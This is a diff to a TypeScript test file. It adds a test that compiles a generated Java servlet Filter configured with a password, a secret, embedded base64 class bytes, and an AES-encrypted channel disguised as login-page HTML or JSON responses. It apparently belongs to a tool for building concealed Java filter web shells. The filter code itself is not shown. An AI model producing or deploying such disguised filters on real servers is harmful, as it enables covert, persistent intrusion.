@@ -10,7 +10,7 @@
  * Skipped automatically when no JDK is available.
  */
 import { execFileSync } from "node:child_process";
-import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 
@@ -24,8 +24,8 @@ import {
   encryptField,
   type MimicCipher,
 } from "../connect/mimic-codecs.js";
-import { renderCryptoProbe } from "./java-template.js";
-import { compileJava, hasJavac } from "./javac.js";
+import { renderCryptoProbe, renderFilterJava, renderWrapperJava } from "./java-template.js";
+import { compileJava, hasJavac, servletApiJar } from "./javac.js";
 
 const HAVE_JAVAC = hasJavac();
 const SECRET = "probe-key-123";
@@ -60,6 +60,37 @@ describe.skipIf(!HAVE_JAVAC)("java <-> ts codec interop (javac available)", () =
 
   afterAll(() => {
     if (dir) rmSync(dir, { recursive: true, force: true });
+  });
+
+  it("the generated filter compiles (mixed placeholder + HTML templates)", () => {
+    const pkg = join(dir, "mimic");
+    mkdirSync(pkg, { recursive: true });
+    // phase 1: the body wrapper (also proves its standalone source compiles)
+    const wrapperFile = join(pkg, "CachedBody.java");
+    writeFileSync(wrapperFile, renderWrapperJava(), "utf8");
+    compileJava([wrapperFile], dir, { classpath: [servletApiJar()] });
+    const wrapper = {
+      bodyB64: readFileSync(join(pkg, "CachedBody.class")).toString("base64"),
+      streamB64: readFileSync(join(pkg, "CachedBody$Stream.class")).toString("base64"),
+    };
+    // phase 2: the filter with the wrapper bytes embedded
+    const java = renderFilterJava({
+      className: "CompileCheck",
+      pass: "p",
+      secret: "k",
+      fields: ["verCode", "token"],
+      bodyContentTypes: ["json"],
+      templates: [
+        { template: "<html><body>登录</body></html>", contentType: "text/html;charset=UTF-8" },
+        { template: '{"code":0,"data":"{{payload}}"}', contentType: "application/json" },
+      ],
+      cipher: { algorithm: "aes-cbc", encoding: "base64", padTail: true, marker: "html-comment" },
+      wrapper,
+    });
+    const file = join(pkg, "CompileCheck.java");
+    writeFileSync(file, java, "utf8");
+    // throws on any javac error — the servlet API jar covers Filter/wrapper types
+    compileJava([file], dir, { classpath: [servletApiJar()] });
   });
 
   function javaProbe(index: number, mode: "enc" | "dec", value: string): string {
